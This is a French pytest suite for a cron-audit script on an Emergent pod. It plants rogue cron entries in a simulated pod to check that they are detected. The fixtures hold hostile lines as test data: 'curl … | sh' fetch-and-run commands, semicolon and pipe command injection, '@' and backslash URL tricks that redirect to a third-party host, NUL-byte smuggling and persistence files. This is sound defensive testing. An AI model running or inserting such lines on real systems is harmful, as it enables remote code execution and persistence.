"""Contrôle des crons du pod Emergent (scripts/controle_crons_emergent.sh).

Audit de sécurité, C3 et point 17. Le script est lancé sur un pod simulé :
rendus réels de webhook-crons (historique git, commits 92d07699 et f5a14932,
identifiants remplacés), fichiers Debian de /etc/cron.d relevés sur le pod le
06/11/2026, et scripts de la plateforme tels que versionnés.
"""

import base64
import hashlib
import shutil
import subprocess
from pathlib import Path

import pytest

RACINE = Path(__file__).resolve().parents[2]
SCRIPT = RACINE / "scripts" / "controle_crons_emergent.sh"
MANIFESTE = RACINE / "scripts" / "crons_emergent_sha256.txt"
SCRIPTS_PLATEFORME = ("dispatch_webhook.sh", "watch_crons.sh", "webhook_crond.sh")

JOB = "0b3c5d7e-1f2a-4b6c-8d9e-0a1b2c3d4e5f"
RENDU = """# Managed by Emergent webhook-cron (pod-local syscron). DO NOT EDIT.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
JOB_ID={job}
WEBHOOK_ENV_FILE=/app/backend/.env
CRON_API_URL=https://{hote}

* * * * * root JOB_ID={job} CRON_API_URL=https://{hote} /bin/sh /app/.emergent/cron/watch_crons.sh >> /var/log/webhook-cron.log 2>&1
"""
PLACEHOLDER = (
    "# DO NOT EDIT OR REMOVE\n"
    "# This file is a simple placeholder to keep dpkg from removing this directory\n"
)
E2SCRUB = (
    "30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 "
    "/usr/lib/aarch64-linux-gnu/e2fsprogs/e2scrub_all_cron\n"
    "10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r\n"
)


def _b64(texte):
    return base64.b64encode(texte.encode()).decode()


def _dispatch(url="https://git-sync-41.preview.emergentagent.com/api/taches/maj", extra=""):
    return (
        f"0 3 * * * root JOB_ID={JOB} CRON_API_URL=https://as.int.apis.emergentagent.com "
        "WEBHOOK_ENV_FILE=/app/backend/.env CRON_NAME=maj METHOD=POST "
        f"ENDPOINT_URL_B64={_b64(url)}{extra} /bin/sh /app/.emergent/cron/dispatch_webhook.sh "
        ">> /var/log/webhook-cron.log 2>&1\n"
    )


@pytest.fixture
def pod(tmp_path):
    """Pod simulé, sain : renvoie une fonction qui lance le contrôle."""
    emergent = tmp_path / "emergent"
    (emergent / "cron").mkdir(parents=True)
    cron_d = tmp_path / "cron.d"
    cron_d.mkdir()
    spool = tmp_path / "spool"
    spool.mkdir()
    for nom in SCRIPTS_PLATEFORME:
        shutil.copy(RACINE / ".emergent" / "cron" / nom, emergent / "cron" / nom)
    rendu = RENDU.format(job=JOB, hote="as.int.apis.emergentagent.com")
    (emergent / "cron" / "webhook-crons").write_text(rendu)
    (cron_d / "webhook-crons").write_text(rendu)
    (cron_d / ".placeholder").write_text(PLACEHOLDER)
    (cron_d / "e2scrub_all").write_text(E2SCRUB)

    def lancer(**env_en_plus):
        env = {
            "PATH": "/usr/bin:/bin",
            "EMERGENT_DIR": str(emergent),
            "CRON_D": str(cron_d),
            "CRON_SPOOL": str(spool),
            **env_en_plus,
        }
        r = subprocess.run(["bash", str(SCRIPT)], capture_output=True, text=True, env=env)
        return r.returncode, r.stdout + r.stderr

    lancer.emergent, lancer.cron_d, lancer.spool = emergent, cron_d, spool
    return lancer


def _crons_yml_legitime(pod, tmp_path):
    """crons.yml déclaré au manifeste : les lignes dispatch redeviennent permises."""
    crons_yml = pod.emergent / "crons.yml"
    crons_yml.write_text("crons: []\n")
    manifeste = tmp_path / "manifeste.txt"
    empreinte = hashlib.sha256(crons_yml.read_bytes()).hexdigest()
    manifeste.write_text(MANIFESTE.read_text() + f"{empreinte}  .emergent/crons.yml\n")
    return {"MANIFESTE": str(manifeste)}


def _ecrire_partout(pod, contenu):
    (pod.emergent / "cron" / "webhook-crons").write_text(contenu)
    (pod.cron_d / "webhook-crons").write_text(contenu)


def test_le_manifeste_correspond_aux_scripts_versionnes():
    """Une modification des scripts de la plateforme passe par une revue du manifeste."""
    attendu = {
        f".emergent/cron/{nom}": hashlib.sha256(
            (RACINE / ".emergent" / "cron" / nom).read_bytes()
        ).hexdigest()
        for nom in SCRIPTS_PLATEFORME
    }
    lu = dict(reversed(ligne.split()) for ligne in MANIFESTE.read_text().splitlines() if ligne)
    assert lu == attendu


@pytest.mark.parametrize("hote", ["as.int.apis.emergentagent.com", "ea.int.apis.emergentagent.com"])
def test_un_pod_sain_ne_signale_rien(pod, hote):
    _ecrire_partout(pod, RENDU.format(job=JOB, hote=hote))
    code, sortie = pod()
    assert code == 0, sortie
    assert "✓ Aucune entrée cron hors forme Emergent." in sortie


def test_hors_du_pod_rien_n_est_signale(tmp_path):
    r = subprocess.run(
        ["bash", str(SCRIPT)],
        capture_output=True,
        text=True,
        env={
            "PATH": "/usr/bin:/bin",
            "EMERGENT_DIR": str(tmp_path / "rien"),
            "CRON_D": str(tmp_path / "rien-non-plus"),
        },
    )
    assert r.returncode == 0, r.stdout
    assert "absent" in r.stdout


def test_une_ligne_plantee_est_signalee_sans_afficher_ses_valeurs(pod):
    secret = "jeton-tres-secret-0123456789abcdef"
    rendu = RENDU.format(job=JOB, hote="as.int.apis.emergentagent.com")
    _ecrire_partout(pod, rendu + f"*/5 * * * * root TOKEN={secret} curl -s https://x.test | sh\n")
    code, sortie = pod()
    assert code == 1
    assert "hors forme Emergent" in sortie and "TOKEN=***" in sortie
    assert secret not in sortie


def test_une_tache_dispatch_sans_crons_yml_est_signalee(pod, tmp_path):
    rendu = RENDU.format(job=JOB, hote="as.int.apis.emergentagent.com") + _dispatch()
    _ecrire_partout(pod, rendu)
    code, sortie = pod()
    assert code == 1 and "crons.yml absent" in sortie

    code, sortie = pod(**_crons_yml_legitime(pod, tmp_path))
    assert code == 0, sortie


def test_un_crons_yml_hors_manifeste_est_signale(pod):
    """Un crons.yml vide créé par un attaquant rouvrirait les lignes dispatch."""
    (pod.emergent / "crons.yml").write_text("")
    code, sortie = pod()
    assert code == 1 and "crons.yml présent" in sortie


@pytest.mark.parametrize(
    "ligne",
    [
        # Contournements déjà fermés par le contrôle de sync_emergent.sh.
        _dispatch(url="https://x.emergentagent.com@tiers.test/"),
        _dispatch(url="https://x.emergentagent.com\\@tiers.test/"),
        _dispatch(url="https://tiers.test/"),
        _dispatch(extra="; curl tiers.test"),
        _dispatch(extra=" | sh"),
        _dispatch().replace("ENDPOINT_URL_B64=", "ENDPOINT_URL_B64=!!pas-du-base64!!"),
        _dispatch(url="https://a.emergentagent.com/" + "x" * 2100),
        _dispatch(extra=f" ENDPOINT_URL_B64={_b64('https://tiers.test/')}"),
    ],
    ids=["arobase", "antislash", "hote-tiers", "point-virgule", "tube", "base64", "long", "repete"],
)
def test_les_contournements_connus_restent_signales(pod, tmp_path, ligne):
    env = _crons_yml_legitime(pod, tmp_path)
    _ecrire_partout(pod, RENDU.format(job=JOB, hote="as.int.apis.emergentagent.com"))
    assert pod(**env)[0] == 0  # sans la ligne, rien à signaler
    _ecrire_partout(pod, RENDU.format(job=JOB, hote="as.int.apis.emergentagent.com") + ligne)
    code, sortie = pod(**env)
    assert code == 1, sortie


def test_un_octet_nul_dans_webhook_crons_est_signale(pod):
    """read de bash efface le NUL, que cron garde : la ligne lue n'est pas celle lancée."""
    rendu = RENDU.format(job=JOB, hote="as.int.apis.emergentagent.com")
    _ecrire_partout(pod, rendu.replace("watch_crons.sh", "watch_crons.sh\0; curl tiers.test"))
    code, sortie = pod()
    assert code == 1 and "octet de contrôle" in sortie


def test_copies_divergentes(pod):
    (pod.cron_d / "webhook-crons").write_text(
        RENDU.format(job=JOB, hote="ea.int.apis.emergentagent.com")
    )
    code, sortie = pod()
    assert code == 1 and "diffère de la copie persistante" in sortie


def test_un_fichier_ajoute_dans_cron_d_est_signale(pod):
    (pod.cron_d / "0persistance").write_text("* * * * * root /tmp/x\n")
    code, sortie = pod()
    assert code == 1 and "fichier inattendu" in sortie and "0persistance" in sortie


@pytest.mark.parametrize("nom", ["e2scrub_all", ".placeholder"])
def test_un_fichier_debian_modifie_est_signale(pod, nom):
    fichier = pod.cron_d / nom
    fichier.write_text(fichier.read_text() + "* * * * * root /tmp/x\n")
    code, sortie = pod()
    assert code == 1 and "hors forme Debian" in sortie


def test_une_crontab_d_utilisateur_est_signalee(pod):
    (pod.spool / "root").write_text("* * * * * /tmp/x\n")
    code, sortie = pod()
    assert code == 1 and "crontab d'utilisateur" in sortie


def test_un_script_de_la_plateforme_modifie_est_signale(pod):
    script = pod.emergent / "cron" / "watch_crons.sh"
    script.write_text(script.read_text() + "curl -s https://tiers.test | sh\n")
    code, sortie = pod()
    assert code == 1 and "script de la plateforme modifié : .emergent/cron/watch_crons.sh" in sortie


def test_sans_manifeste_le_controle_est_incomplet(pod, tmp_path):
    code, sortie = pod(MANIFESTE=str(tmp_path / "absent.sha256"))
    assert code == 2 and "incomplet" in sortie

    vide = tmp_path / "vide.txt"
    vide.write_text("")
    code, sortie = pod(MANIFESTE=str(vide))
    assert code == 2 and "aucune empreinte" in sortie


def test_la_derniere_ligne_du_manifeste_est_lue_sans_saut_de_ligne(pod, tmp_path):
    manifeste = tmp_path / "manifeste.txt"
    manifeste.write_text(MANIFESTE.read_text().rstrip("\n"))
    script = pod.emergent / "cron" / "webhook_crond.sh"
    script.write_text(script.read_text() + "curl -s https://tiers.test | sh\n")
    code, sortie = pod(MANIFESTE=str(manifeste))
    assert code == 1 and "webhook_crond.sh" in sortie


def test_e2scrub_all_x86_64_est_admis_mais_pas_une_architecture_inventee(pod):
    fichier = pod.cron_d / "e2scrub_all"
    fichier.write_text(E2SCRUB.replace("aarch64", "x86_64"))
    assert pod()[0] == 0
    fichier.write_text(E2SCRUB.replace("aarch64", "pirate"))
    assert pod()[0] == 1


def test_sync_emergent_appelle_le_script_au_lieu_de_le_recopier():
    texte = (RACINE / "sync_emergent.sh").read_text()
    assert "bash scripts/controle_crons_emergent.sh || CRON_ALERT=$?" in texte
    assert "env -u EMERGENT_DIR -u CRON_D -u CRON_SPOOL -u MANIFESTE" in texte
    assert "_check_emergent_crons()" not in texte
